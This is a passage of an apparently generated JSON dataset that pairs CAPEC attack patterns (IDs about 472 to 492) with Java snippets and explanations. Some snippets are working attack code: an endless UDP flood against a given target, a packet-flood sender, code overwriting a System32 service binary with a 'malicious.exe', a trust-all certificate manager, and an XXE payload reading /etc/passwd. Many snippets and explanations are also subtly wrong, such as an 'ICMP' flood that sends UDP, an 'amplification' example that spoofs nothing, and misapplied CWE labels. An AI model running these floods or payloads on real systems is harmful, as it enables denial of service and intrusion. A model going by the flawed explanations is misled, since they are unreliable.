        "description": "This Java code snippet demonstrates a vulnerable implementation of library loading that can be exploited through Search Order Hijacking. The code first attempts to load a library (example.dll) from the current directory, which is a common practice. However, if an attacker can place a rogue version of the library in the current directory or another directory that is searched before the legitimate library location, the rogue library will be loaded instead. This is an example of CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path). The code also simulates an attacker placing a rogue library in the temporary directory, which is then loaded by the application, further illustrating the vulnerability."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class BrowserFingerprintingServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userAgent = request.getHeader(\"User-Agent\");\n        String browserInfo = getBrowserInfo(userAgent);\n\n        // Vulnerable: Exposing sensitive information in the query string\n        response.sendRedirect(\"/exploit?browser=\" + browserInfo);\n    }\n\n    private String getBrowserInfo(String userAgent) {\n        if (userAgent.contains(\"Chrome\")) {\n            return \"Chrome\";\n        } else if (userAgent.contains(\"Firefox\")) {\n            return \"Firefox\";\n        } else if (userAgent.contains(\"MSIE\")) {\n            return \"Internet Explorer\";\n        } else {\n            return \"Unknown\";\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a basic form of browser fingerprinting by extracting the 'User-Agent' header from the HTTP request to determine the browser type. The 'getBrowserInfo' method checks the 'User-Agent' string for known browser identifiers and returns the browser name. The servlet then redirects the user to an '/exploit' endpoint, appending the browser information as a query parameter. This approach is vulnerable to several issues: it exposes sensitive information (the browser type) in the query string (CWE-598), and it could be part of a larger attack that exploits browser-specific vulnerabilities (CAPEC-200). Additionally, the code does not properly neutralize user input, which could lead to cross-site scripting (CWE-79)."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "import java.security.KeyFactory;\nimport java.security.PrivateKey;\nimport java.security.PublicKey;\nimport java.security.Signature;\nimport java.security.spec.PKCS8EncodedKeySpec;\nimport java.security.spec.X509EncodedKeySpec;\nimport java.util.Base64;\n\npublic class SignatureSpoofExample {\n    private static final String ALGORITHM = \"SHA1withRSA\"; // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n\n    public static void main(String[] args) throws Exception {\n        String message = \"This is a secret message\";\n        String fakeSignature = \"fakeSignature\"; // CWE-290: Authentication Bypass by Spoofing\n\n        // Simulate receiving a public key (in reality, this should be securely obtained)\n        String publicKeyStr = \"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...\";\n        PublicKey publicKey = getPublicKey(publicKeyStr);\n\n        // Verify the signature (incorrectly trusting the fake signature)\n        boolean isVerified = verifySignature(message, fakeSignature, publicKey);\n        System.out.println(\"Signature verified: \" + isVerified);\n    }\n\n    public static PublicKey getPublicKey(String base64PublicKey) throws Exception {\n        byte[] keyBytes = Base64.getDecoder().decode(base64PublicKey);\n        X509EncodedKeySpec spec = new X509EncodedKeySpec(keyBytes);\n        KeyFactory keyFactory = KeyFactory.getInstance(\"RSA\");\n        return keyFactory.generatePublic(spec);\n    }\n\n    public static boolean verifySignature(String data, String signature, PublicKey publicKey) throws Exception {\n        Signature sig = Signature.getInstance(ALGORITHM);\n        sig.initVerify(publicKey);\n        sig.update(data.getBytes());\n        return sig.verify(Base64.getDecoder().decode(signature)); // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can spoof a signature, making the recipient believe that a message was signed by a reputable source. The code uses a broken or risky cryptographic algorithm (CWE-327) and incorrectly trusts a fake signature (CWE-290). The public key is assumed to be securely obtained, but in reality, it could be spoofed. The verification process does not ensure the integrity of the message during transmission (CWE-924), leading to potential exploitation. This example highlights the importance of proper input validation, secure cryptographic practices, and ensuring message integrity."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "import java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PrivateKey;\nimport java.security.PublicKey;\nimport java.security.Signature;\nimport java.util.Base64;\n\npublic class SignatureSpoofingExample {\n    private static PrivateKey stolenPrivateKey;\n    private static PublicKey publicKey;\n\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair pair = keyGen.generateKeyPair();\n        stolenPrivateKey = pair.getPrivate();\n        publicKey = pair.getPublic();\n\n        // Sign data with the stolen private key\n        String data = \"Sensitive data\";\n        String signature = signData(data, stolenPrivateKey);\n\n        // Verify the signature with the public key\n        boolean isVerified = verifySignature(data, signature, publicKey);\n        System.out.println(\"Signature verified: \" + isVerified);\n    }\n\n    private static String signData(String data, PrivateKey privateKey) throws Exception {\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        signature.update(data.getBytes());\n        byte[] signedData = signature.sign();\n        return Base64.getEncoder().encodeToString(signedData);\n    }\n\n    private static boolean verifySignature(String data, String signature, PublicKey publicKey) throws Exception {\n        Signature sig = Signature.getInstance(\"SHA256withRSA\");\n        sig.initVerify(publicKey);\n        sig.update(data.getBytes());\n        byte[] signedData = Base64.getDecoder().decode(signature);\n        return sig.verify(signedData);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario of 'Signature Spoofing by Key Theft'. The code generates a key pair, simulating the theft of a private key (stolenPrivateKey). It then signs some data using this stolen private key and verifies the signature using the corresponding public key. This represents the attack where an attacker uses a stolen private key to forge signatures, misleading victims into believing the data is from a legitimate source. The code also touches on CWE-522 (Insufficiently Protected Credentials) by implying the private key could be stolen, and CWE-322 (Key Exchange without Entity Authentication) by not verifying the identity of the key owner."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "import java.security.Signature;\nimport java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PublicKey;\nimport java.security.PrivateKey;\nimport java.util.Base64;\n\npublic class SignatureVerification {\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair pair = keyGen.generateKeyPair();\n        PrivateKey privateKey = pair.getPrivate();\n        PublicKey publicKey = pair.getPublic();\n\n        // Create a signature\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        String data = \"Sensitive data\";\n        signature.update(data.getBytes());\n        byte[] signedData = signature.sign();\n\n        // Verify the signature (vulnerable part)\n        Signature signatureVerify = Signature.getInstance(\"SHA256withRSA\");\n        signatureVerify.initVerify(publicKey);\n        signatureVerify.update(data.getBytes());\n        boolean isValid = signatureVerify.verify(Base64.getDecoder().decode(signedData)); // Improper verification\n\n        System.out.println(\"Signature valid: \" + isValid);\n    }\n}",
        "description": "This Java code snippet demonstrates a cryptographic signature generation and verification process. The code generates a key pair, signs a piece of data using the private key, and then attempts to verify the signature using the public key. The vulnerability lies in the improper verification of the cryptographic signature, where the `Base64.getDecoder().decode(signedData)` is used incorrectly, potentially allowing an adversary to exploit this weakness and generate a valid signature without knowing the key. This embodies the main idea of CAPEC-347 (Signature Spoofing by Improper Validation) and is related to CWE-347 (Improper Verification of Cryptographic Signature) and CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "import java.security.Signature;\nimport java.security.PublicKey;\nimport java.util.Base64;\n\npublic class SignatureVerification {\n    public static boolean verifySignature(String data, String signature, PublicKey publicKey) {\n        try {\n            Signature sig = Signature.getInstance(\"SHA256withRSA\");\n            sig.initVerify(publicKey);\n            sig.update(data.getBytes());\n            byte[] signatureBytes = Base64.getDecoder().decode(signature);\n            return sig.verify(signatureBytes);\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        // Example usage\n        String data = \"Important data\";\n        String fakeSignature = \"FakeSignatureBase64\";\n        PublicKey publicKey = getPublicKey(); // Assume this method retrieves the correct public key\n\n        if (verifySignature(data, fakeSignature, publicKey)) {\n            System.out.println(\"Signature is valid.\");\n        } else {\n            System.out.println(\"Signature is invalid.\");\n        }\n    }\n\n    private static PublicKey getPublicKey() {\n        // Placeholder for public key retrieval logic\n        return null;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of cryptographic signature verification. The `verifySignature` method attempts to verify a signature using a public key. However, the code does not properly handle cases where the public key might be spoofed or the signature might be tampered with. The `getPublicKey` method is a placeholder and does not implement any actual logic to retrieve a valid public key, which can lead to an attacker providing a fake public key. This embodies the CAPEC 'Signature Spoofing by Misrepresentation' by showing how an attacker could exploit weaknesses in signature verification (CWE-347) and authentication bypass (CWE-290). The code also lacks proper error handling and validation, making it susceptible to various attacks."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "import java.security.Signature;\nimport java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PrivateKey;\nimport java.security.PublicKey;\nimport java.util.Base64;\n\npublic class SignatureSpoofingExample {\n    public static void main(String[] args) throws Exception {\n        // Generate key pair\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair pair = keyGen.generateKeyPair();\n        PrivateKey privateKey = pair.getPrivate();\n        PublicKey publicKey = pair.getPublic();\n\n        // Data to be signed\n        String signedData = \"This is signed data.\";\n        String unsignedData = \"This is unsigned data.\";\n\n        // Sign the signedData\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        signature.update(signedData.getBytes());\n        byte[] signedBytes = signature.sign();\n        String signedString = Base64.getEncoder().encodeToString(signedBytes);\n\n        // Mix signed and unsigned content\n        String mixedContent = signedString + unsignedData;\n\n        // Verify the mixed content (incorrectly)\n        signature.initVerify(publicKey);\n        signature.update(mixedContent.getBytes());\n        boolean isVerified = signature.verify(signedBytes);\n\n        // Output the result\n        System.out.println(\"Verification result: \" + isVerified);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can exploit the complexity of a data structure that allows for both signed and unsigned content. The code generates a key pair, signs a piece of data, and then mixes this signed data with unsigned data. The verification process incorrectly attempts to verify the mixed content as if it were entirely signed, leading to a false verification result. This embodies the CAPEC 'Signature Spoofing by Mixing Signed and Unsigned Content' and highlights related CWEs such as 'Improper Verification of Cryptographic Signature' (CWE-347) and 'Protection Mechanism Failure' (CWE-693)."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.Set;\n\npublic class ModifyWindowsServiceConfig {\n    public static void main(String[] args) {\n        String serviceConfigPath = \"C:\\\\Windows\\\\System32\\\\service.exe\";\n        String maliciousBinaryPath = \"C:\\\\malicious.exe\";\n\n        try {\n            // Improper Access Control: No validation of user permissions\n            Set<PosixFilePermission> permissions = PosixFilePermissions.fromString(\"rwxrwxrwx\");\n            Files.setPosixFilePermissions(Paths.get(serviceConfigPath), permissions);\n\n            // External Control of System or Configuration Setting\n            Files.copy(Paths.get(maliciousBinaryPath), Paths.get(serviceConfigPath), java.nio.file.StandardCopyOption.REPLACE_EXISTING);\n\n            System.out.println(\"Service configuration modified to execute malicious binary.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can modify the configuration of a Windows service to execute a malicious binary. The code does not validate user permissions (CWE-284: Improper Access Control) and allows external control of system settings (CWE-15: External Control of System or Configuration Setting). The service executable path is replaced with a malicious binary, showcasing how improper access control can lead to the execution of unauthorized code."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "import java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport javax.net.ssl.X509TrustManager;\n\npublic class VulnerableTrustManager implements X509TrustManager {\n    @Override\n    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        // Trust all client certificates\n    }\n\n    @Override\n    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        // Trust all server certificates\n    }\n\n    @Override\n    public X509Certificate[] getAcceptedIssuers() {\n        return new X509Certificate[0];\n    }\n\n    public static void main(String[] args) {\n        // Example usage of the vulnerable trust manager\n        javax.net.ssl.SSLContext sslContext;\n        try {\n            sslContext = javax.net.ssl.SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, new X509TrustManager[]{new VulnerableTrustManager()}, new java.security.SecureRandom());\n            javax.net.ssl.HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of an X509TrustManager that trusts all client and server certificates without proper validation. This is an example of CWE-295 (Improper Certificate Validation) and CWE-296 (Improper Following of a Certificate's Chain of Trust). The `checkClientTrusted` and `checkServerTrusted` methods are overridden to trust all certificates, which can be exploited by an adversary to install a malicious root certificate on a compromised system. This allows the adversary to avoid security warnings and spoof legitimate websites, capturing sensitive information such as login credentials."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VirtualizationEscape {\n    public static void main(String[] args) {\n        try {\n            // Simulate a virtualized environment by running a command in a sandbox\n            Process process = Runtime.getRuntime().exec(\"sandboxed_command\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n\n            // Vulnerability: Improper isolation allows escape from the sandbox\n            // Execute a command on the host system\n            Process hostProcess = Runtime.getRuntime().exec(\"host_command\");\n            BufferedReader hostReader = new BufferedReader(new InputStreamReader(hostProcess.getInputStream()));\n            while ((line = hostReader.readLine()) != null) {\n                System.out.println(line);\n            }\n            hostReader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can escape from a virtualized environment (sandbox) and execute commands on the host system. The code first runs a command within a simulated sandbox environment. Due to improper isolation (CWE-653), the attacker can then execute another command directly on the host system, representing a failure in the protection mechanism (CWE-693). This escape from the virtualized environment to the host system embodies the main idea of the CAPEC 'Escaping Virtualization'."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "import java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class DomainFrontingExample {\n    public static void main(String[] args) throws IOException {\n        String targetUrl = \"https://example.com\";\n        URL url = new URL(targetUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setRequestProperty(\"Host\", \"malicious.com\"); // CWE-941: Incorrectly Specified Destination\n        connection.setRequestProperty(\"SNI\", \"\"); // Domainless Fronting\n\n        int responseCode = connection.getResponseCode();\n        System.out.println(\"Response Code: \" + responseCode);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of the 'Contradictory Destinations in Traffic Routing Schemes' attack, specifically using the Domain Fronting technique. The code sets up an HTTP connection to 'https://example.com' but specifies a different 'Host' header ('malicious.com'), which can cause the traffic to be routed incorrectly. Additionally, the SNI (Server Name Indication) field is left blank to illustrate Domainless Fronting. This example embodies CWE-941 (Incorrectly Specified Destination in a Communication Channel) by not correctly specifying the intended destination. The code highlights how an adversary can manipulate headers to route traffic to unintended endpoints, potentially leading to security vulnerabilities."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class TCPFloodVulnerableServer {\n    private static final int PORT = 8080;\n    private static final int MAX_CONNECTIONS = 1000; // CWE-770: No limit on resource allocation\n    private static ExecutorService executor = Executors.newFixedThreadPool(MAX_CONNECTIONS);\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(PORT)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                executor.submit(() -> handleClient(clientSocket));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try {\n            // CWE-319: Cleartext transmission of sensitive information\n            clientSocket.getOutputStream().write(\"Welcome to the server!\\n\".getBytes());\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple TCP server that is vulnerable to a TCP flood attack. The server listens on port 8080 and uses a fixed thread pool to handle incoming connections. However, it does not impose any restrictions on the number of connections (CWE-770), making it susceptible to resource exhaustion. Additionally, the server sends a welcome message in cleartext (CWE-319), which can be intercepted by unauthorized actors. This code embodies the main idea of the CAPEC by demonstrating how an adversary can exploit the lack of resource limits and cleartext transmission to deny legitimate users access to the service."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.Validator;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlInput = \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><foo>&xxe;</foo>\";\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(xmlInput)));\n            System.out.println(\"Parsed XML: \" + document.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void validateXML(String xmlInput) throws SAXException, IOException {\n        SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\n        Schema schema = factory.newSchema(new StreamSource(new StringReader(\"<xs:schema xmlns:xs=\\\"http://www.w3.org/2001/XMLSchema\\\"></xs:schema>\")));\n        Validator validator = schema.newValidator();\n        validator.validate(new StreamSource(new StringReader(xmlInput)));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to XML External Entity (XXE) attacks. The code accepts an XML input containing an external entity reference, which can be exploited to read sensitive files from the server. The DocumentBuilderFactory is configured with secure processing, but the code does not properly validate the XML against a schema, nor does it disable external entity resolution. This embodies the main idea of the deprecated CAPEC-230 and CAPEC-231, highlighting issues such as missing XML validation (CWE-112) and improper restriction of XML external entity references (CWE-611)."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "import java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PrivateKey;\nimport java.security.Signature;\nimport java.security.SecureRandom;\nimport java.util.Base64;\n\npublic class SignatureSpoofing {\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair using a predictable random number generator\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        SecureRandom predictableRandom = new SecureRandom(new byte[]{1, 2, 3, 4}); // CWE-330, CWE-1241\n        keyGen.initialize(2048, predictableRandom);\n        KeyPair keyPair = keyGen.generateKeyPair();\n        PrivateKey privateKey = keyPair.getPrivate();\n\n        // Sign a message\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        String message = \"This is a secret message\";\n        signature.update(message.getBytes());\n        byte[] signedMessage = signature.sign();\n        String encodedSignature = Base64.getEncoder().encodeToString(signedMessage);\n\n        System.out.println(\"Signed Message: \" + encodedSignature);\n\n        // An attacker can predict the private key and forge a signature\n        // This demonstrates the vulnerability of using a predictable random number generator\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Signature Spoofing by Key Recreation' (CAPEC). The code generates an RSA key pair using a predictable random number generator (CWE-330, CWE-1241). The private key generated in this manner can be predicted by an attacker, allowing them to recreate the key and forge signatures. The code then signs a message using this private key. The predictability of the random number generator compromises the security of the cryptographic operations, making it possible for an attacker to spoof signatures and mislead victims."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPFlood {\n    public static void main(String[] args) throws Exception {\n        if (args.length < 3) {\n            System.out.println(\"Usage: java UDPFlood <target_ip> <target_port> <message>\");\n            return;\n        }\n\n        String targetIp = args[0];\n        int targetPort = Integer.parseInt(args[1]);\n        String message = args[2];\n\n        InetAddress targetAddress = InetAddress.getByName(targetIp);\n        byte[] buffer = message.getBytes();\n\n        DatagramSocket socket = new DatagramSocket();\n\n        while (true) {\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);\n            socket.send(packet);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic UDP flood attack. The program sends a continuous stream of UDP packets to a specified target IP address and port, using a message provided as an argument. This can overwhelm the target's network bandwidth and resources, potentially leading to a denial of service. The code does not impose any limits on the number of packets sent (CWE-770), does not verify the integrity of the message (CWE-924), and can be used to send a large volume of traffic (CWE-406). The session-less nature of UDP makes it easy to spoof the source address, complicating the identification of the attack's origin."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class IcmpFlood {\n    public static void main(String[] args) throws IOException {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java IcmpFlood <target IP> <packet count>\");\n            return;\n        }\n\n        String targetIp = args[0];\n        int packetCount = Integer.parseInt(args[1]);\n        byte[] buffer = new byte[1024]; // CWE-770: No limit on resource allocation\n\n        InetAddress targetAddress = InetAddress.getByName(targetIp);\n        DatagramSocket socket = new DatagramSocket();\n\n        for (int i = 0; i < packetCount; i++) {\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 7); // CWE-941: Incorrectly specified destination\n            socket.send(packet);\n            System.out.println(\"Sent packet \" + (i + 1));\n        }\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates an ICMP flood attack, where a large number of ICMP packets are sent to a target IP address to consume network bandwidth and deny service to legitimate users. The code takes two arguments: the target IP address and the number of packets to send. It creates a DatagramSocket and sends the specified number of packets to the target. The code embodies CWE-770 by not limiting the number of packets that can be sent, potentially leading to resource exhaustion. CWE-941 is represented by the hardcoded destination port (7), which may not be the intended destination for ICMP packets. This code is for educational purposes only and should not be used maliciously."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableEndpoint\")\npublic class VulnerableServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No rate limiting or resource allocation limits\n        String sensitiveData = request.getParameter(\"sensitiveData\");\n        // Processing sensitive data in GET request\n        response.getWriter().append(\"Sensitive Data: \").append(sensitiveData);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable endpoint that can be exploited by an HTTP Flood attack. The servlet processes HTTP GET requests without any rate limiting or resource allocation limits (CWE-770 and CWE-410). Additionally, it includes sensitive information in the query string of the GET request (CWE-598). This setup makes it easy for an attacker to flood the server with legitimate-looking requests, consuming server resources and potentially leading to a denial of service for legitimate users. The lack of resource management and the use of GET requests for sensitive data are key weaknesses that align with the described CAPEC scenario."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "import javax.net.ssl.SSLServerSocketFactory;\nimport javax.net.ssl.SSLServerSocket;\nimport javax.net.ssl.SSLSocket;\nimport java.io.IOException;\n\npublic class SSLFloodVulnerableServer {\n    public static void main(String[] args) {\n        SSLServerSocketFactory factory = (SSLServerSocketFactory) SSLServerSocketFactory.getDefault();\n        try (SSLServerSocket serverSocket = (SSLServerSocket) factory.createServerSocket(8443)) {\n            while (true) {\n                SSLSocket socket = (SSLSocket) serverSocket.accept();\n                // No throttling or resource limits\n                new Thread(() -> handleRequest(socket)).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleRequest(SSLSocket socket) {\n        try {\n            // Simulate SSL handshake processing\n            socket.startHandshake();\n            // Keep the connection open to simulate resource consumption\n            Thread.sleep(10000);\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable SSL server that is susceptible to an SSL Flood attack. The server listens for incoming SSL connections on port 8443 and spawns a new thread for each connection to handle the SSL handshake. The code does not implement any throttling or resource limits, which means an attacker can create a large number of SSL connections, consuming server resources and potentially leading to a denial of service. This demonstrates CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-410 (Insufficient Resource Pool), and CWE-400 (Uncontrolled Resource Consumption)."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class AmplificationAttackExample {\n    public static void main(String[] args) throws Exception {\n        String targetIp = \"192.168.1.100\"; // Target server IP\n        String spoofedIp = \"192.168.1.101\"; // Spoofed IP address\n        int port = 12345; // Target port\n        String message = \"Request\"; // Small request message\n\n        // Create a UDP socket\n        DatagramSocket socket = new DatagramSocket();\n\n        // Convert message to bytes\n        byte[] buffer = message.getBytes();\n\n        // Create a packet with the spoofed IP address\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, InetAddress.getByName(spoofedIp), port);\n\n        // Send the packet to the target server\n        socket.send(packet);\n\n        System.out.println(\"Packet sent to \" + targetIp + \" with spoofed IP \" + spoofedIp);\n\n        // Close the socket\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of an amplification attack using UDP packets. The code sends a small request message to a target server, but it spoofs the source IP address to be that of another server. This can cause the target server to receive a much larger response, leading to an amplification effect. The code embodies the main idea of CAPEC-409 (Amplification) and highlights related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-405 (Asymmetric Resource Consumption). The code does not include any throttling or resource allocation limits, making it vulnerable to amplification attacks."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class QuadraticDataExpansion {\n    public static void main(String[] args) {\n        // Define a large entity\n        String largeEntity = \"A\".repeat(10000); // CWE-770: No limit on the size of the entity\n        \n        // Use the large entity multiple times in a single substitution\n        StringBuilder expandedData = new StringBuilder();\n        for (int i = 0; i < 1000; i++) { // CWE-1325: Improperly controlled sequential memory allocation\n            expandedData.append(largeEntity);\n        }\n        \n        // Simulate storing the expanded data in a map\n        Map<String, String> dataMap = new HashMap<>();\n        dataMap.put(\"key\", expandedData.toString()); // CWE-1043: Aggregating large number of non-primitive elements\n        \n        // Print the size of the expanded data\n        System.out.println(\"Size of expanded data: \" + expandedData.length());\n    }\n}",
        "description": "This Java code snippet demonstrates a Quadratic Data Expansion attack. It defines a large entity (a string of 10,000 'A' characters) and uses it multiple times in a loop to create a very large expanded data string. This expanded data is then stored in a map. The code does not impose any limits on the size of the entity or the number of times it is used, leading to excessive memory allocation. This can cause a denial of service by consuming a large amount of memory, potentially causing the application to freeze or crash. The code embodies CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-1325 (Improperly Controlled Sequential Memory Allocation), and CWE-1043 (Data Element Aggregating an Excessively Large Number of Non-Primitive Elements)."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "import java.util.regex.Pattern;\nimport java.util.regex.Matcher;\n\npublic class RegexExponentialBlowup {\n    public static void main(String[] args) {\n        String regex = \"(a+)+\"; // Inefficient regex with exponential complexity\n        String input = \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\"; // Input designed to cause exponential blowup\n\n        Pattern pattern = Pattern.compile(regex);\n        Matcher matcher = pattern.matcher(input);\n\n        long startTime = System.currentTimeMillis();\n        boolean matchFound = matcher.matches();\n        long endTime = System.currentTimeMillis();\n\n        System.out.println(\"Match found: \" + matchFound);\n        System.out.println(\"Time taken: \" + (endTime - startTime) + \"ms\");\n    }\n}",
        "description": "This Java code snippet demonstrates a Regular Expression Exponential Blowup vulnerability. The regular expression '(a+)+' is inefficient and has exponential worst-case complexity. When matched against the input string 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!', it causes excessive CPU consumption due to backtracking. This example highlights CWE-400 (Uncontrolled Resource Consumption) and CWE-1333 (Inefficient Regular Expression Complexity). The code measures the time taken to perform the match, illustrating the potential performance impact of such a vulnerability."
    },
    {
        "capec_id": "493",
